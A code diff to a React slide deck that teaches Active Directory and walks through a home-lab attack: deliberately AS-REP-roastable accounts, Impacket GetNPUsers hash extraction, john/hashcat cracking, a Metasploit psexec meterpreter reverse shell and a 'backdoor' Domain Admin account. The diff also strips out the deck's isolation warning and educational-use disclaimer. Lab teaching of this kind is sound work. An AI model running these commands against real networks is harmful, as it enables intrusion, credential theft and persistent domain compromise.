@@ -628,7 +628,7 @@ function AttackFlowDiagram({ theme }: { theme: Theme }) {
 		{
 			label: "Windows Server 2025",
 			sub: "192.168.56.105",
-			icon: "🖥",
+			icon: "🗄️",
 			color: "#38bdf8",
 			role: "DC · Pivot Node",
 		},
@@ -946,7 +946,7 @@ function makeSlides(theme: Theme) {
 								authentication and authorization — every login, every file
 								share, every printer access goes through AD.
 							</p>
-							<SH theme={theme}>A simple analogy</SH>
+							{/* <SH theme={theme}>A simple analogy</SH>
 							<p
 								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
 							>
@@ -955,7 +955,7 @@ function makeSlides(theme: Theme) {
 									phone book + security guard
 								</strong>{" "}
 								for your entire organization.
-							</p>
+							</p> */}
 						</>
 					}
 					right={
@@ -966,7 +966,6 @@ function makeSlides(theme: Theme) {
 								["Protocol", "LDAP for directory access"],
 								["Auth", "Kerberos (default) + NTLM"],
 								["Name resolution", "DNS — maps names to IPs"],
-								["Config mgmt", "Group Policy Objects (GPOs)"],
 							].map(([k, val]) => (
 								<TermRow key={k} k={k} v={val} theme={theme} />
 							))}
@@ -1007,7 +1006,7 @@ function makeSlides(theme: Theme) {
 								provides the methods for storing directory data and making it
 								available to users and administrators.
 							</p>
-							<SH theme={theme}>Three extra capabilities</SH>
+							{/* <SH theme={theme}>Three extra capabilities</SH>
 							<BList
 								theme={theme}
 								items={[
@@ -1015,7 +1014,7 @@ function makeSlides(theme: Theme) {
 									"Global Catalog — searchable index of all objects across the entire forest",
 									"Query & Index mechanism — lets users/apps quickly find objects by any property",
 								]}
-							/>
+							/> */}
 						</>
 					}
 					right={
@@ -1027,7 +1026,6 @@ function makeSlides(theme: Theme) {
 								["AD LDS", "Lightweight version for app-specific directories"],
 								["AD CS", "Certificate Services — issues PKI certificates"],
 								["AD FS", "Federation Services — SSO with external partners"],
-								["AD RMS", "Rights Management — controls document access"],
 							].map(([k, val]) => (
 								<TermRow key={k} k={k} v={val} theme={theme} />
 							))}
@@ -1183,9 +1181,7 @@ function makeSlides(theme: Theme) {
 									"Single Sign-On (SSO) — log in once, access everything",
 									"Centralised user provisioning and deprovisioning",
 									"Group Policy — enforce password rules, screen locks, software",
-									"Software deployment — push installers across the domain",
 									"File share permissions — mapped drives via GPO",
-									"VPN & Wi-Fi authentication via RADIUS + AD",
 									"Email (Exchange / M365) — mailboxes tied to AD accounts",
 								]}
 							/>
@@ -1258,10 +1254,10 @@ function makeSlides(theme: Theme) {
 									</div>
 								</div>
 							))}
-							<Alert type="danger" theme={theme}>
+							{/* <Alert type="danger" theme={theme}>
 								This is why understanding AD from both sides — admin and
 								attacker — is essential for any network professional.
-							</Alert>
+							</Alert> */}
 						</>
 					}
 				/>
@@ -1276,10 +1272,8 @@ function makeSlides(theme: Theme) {
 			content: (
 				<>
 					<Alert type="warn" theme={theme}>
-						All VMs must be on a Host-Only / Internal network. Never bridge to
-						your real network during the attack phase.
+						All VMs must be on a Host-Only / Internal network.
 					</Alert>
-					<AttackFlowDiagram theme={theme} />
 					<div
 						style={{
 							display: "grid",
@@ -1434,7 +1428,7 @@ Get-WindowsFeature AD-Domain-Services`}
 									"AD DS binaries and management tools",
 									"Active Directory Users and Computers (ADUC)",
 									"Group Policy Management Console (GPMC)",
-									"DNS Server role (added automatically)",
+									"DNS Server role",
 								]}
 							/>
 						</>
@@ -1465,10 +1459,6 @@ Get-WindowsFeature AD-Domain-Services`}
      -AsPlainText -Force) \`
   -Force`}
 							/>
-							<Alert type="info" theme={theme}>
-								The server reboots automatically after promotion. Log back in as
-								LAB\Administrator and run option 15 to return to PowerShell.
-							</Alert>
 						</>
 					}
 					right={
@@ -1525,13 +1515,13 @@ Get-WindowsFeature AD-Domain-Services`}
 New-ADOrganizationalUnit -Name "HR" -Path "DC=lab,DC=local"
 
 $pw = ConvertTo-SecureString "Password123!" -AsPlainText -Force
-New-ADUser -Name "Alice Admin" -SamAccountName aaladin \`
+New-ADUser -Name "user1" -SamAccountName user1 \`
   -AccountPassword $pw -Enabled $true -Path "OU=IT,DC=lab,DC=local"
-New-ADUser -Name "Bob Smith" -SamAccountName bsmith \`
+New-ADUser -Name "user2" -SamAccountName user2 \`
   -AccountPassword $pw -Enabled $true -Path "OU=HR,DC=lab,DC=local"
 
 New-ADGroup -Name "IT-Admins" -GroupScope Global -Path "OU=IT,DC=lab,DC=local"
-Add-ADGroupMember -Identity "Domain Admins" -Members aaladin`}
+Add-ADGroupMember -Identity "Domain Admins" -Members user1`}
 					/>
 					<SH theme={theme} color="#f87171">
 						Intentional Misconfiguration — AS-REP Roastable Account
@@ -1616,7 +1606,6 @@ Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
 								["Hash type", "krb5asrep — hashcat mode 18200"],
 								["Tool", "Impacket GetNPUsers"],
 								["Crack tool", "john / hashcat + rockyou.txt"],
-								["CVE", "Not a CVE — pure misconfiguration"],
 							].map(([k, val]) => (
 								<TermRow key={k} k={k} v={val} theme={theme} />
 							))}
@@ -1644,8 +1633,12 @@ Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
 								theme={theme}
 								lang="bash"
 								code={`sudo pacman -S metasploit nmap
-pip install impacket --break-system-packages`}
+sudo pacman -S impacket`}
 							/>
+						</>
+					}
+					right={
+						<>
 							<SH theme={theme}>2. Verify Connectivity</SH>
 							<CodeBlock
 								theme={theme}
@@ -1653,31 +1646,6 @@ pip install impacket --break-system-packages`}
 								code={`ping 192.168.56.105    # DC
 ping 192.168.56.20     # Win10
 nmap -p 445 192.168.56.105 192.168.56.20`}
-							/>
-						</>
-					}
-					right={
-						<>
-							<SH theme={theme}>3. Prepare Win10 for the Demo</SH>
-							<CodeBlock
-								theme={theme}
-								lang="powershell"
-								code={`# Run as Administrator on Win10
-net user Administrator /active:yes
-net user Administrator Admin123
-Set-MpPreference -DisableRealtimeMonitoring $true
-netsh advfirewall set allprofiles state off`}
-							/>
-							<Alert type="warn" theme={theme}>
-								Take VM snapshots on both DC and Win10 before making these
-								changes so you can reset the lab instantly.
-							</Alert>
-							<SH theme={theme}>4. Disable Defender on DC</SH>
-							<CodeBlock
-								theme={theme}
-								lang="powershell"
-								code={`Set-MpPreference -DisableRealtimeMonitoring $true
-netsh advfirewall set allprofiles state off`}
 							/>
 						</>
 					}
@@ -1704,7 +1672,7 @@ netsh advfirewall set allprofiles state off`}
 									lang="bash"
 									code={`echo "w10" > /tmp/users.txt
 
-impacket-GetNPUsers lab.local/ \\
+GetNPUsers.py lab.local/ \\
   -usersfile /tmp/users.txt \\
   -no-pass \\
   -dc-ip 192.168.56.105 \\
@@ -1735,8 +1703,8 @@ john /tmp/hash.txt --show
 
 use exploit/windows/smb/psexec
 set RHOSTS 192.168.56.105
-set SMBUser Administrator
-set SMBPass Admin123
+set SMBUser m10
+set SMBPass Password123
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.56.1
 set LPORT 4444
@@ -2017,33 +1985,6 @@ net group "Domain Admins" backdoor /add /domain`}
 							</div>
 						))}
 					</div>
-					<div
-						style={{
-							fontSize: "1.25rem",
-							color: v.textStrong,
-							lineHeight: 1.8,
-							borderLeft: "3px solid #a78bfa",
-							paddingLeft: "1.5rem",
-							fontStyle: "italic",
-						}}
-					>
-						&quot;If you know the enemy and know yourself, you need not fear the
-						result of a hundred battles.&quot;
-						<div
-							style={{
-								fontSize: "0.88rem",
-								color: v.textMuted,
-								marginTop: "0.65rem",
-								fontStyle: "normal",
-							}}
-						>
-							— Sun Tzu
-						</div>
-					</div>
-					<Alert type="info" theme={theme}>
-						This demonstration was performed in an isolated lab environment for
-						educational purposes only.
-					</Alert>
 				</div>
 			),
 		},
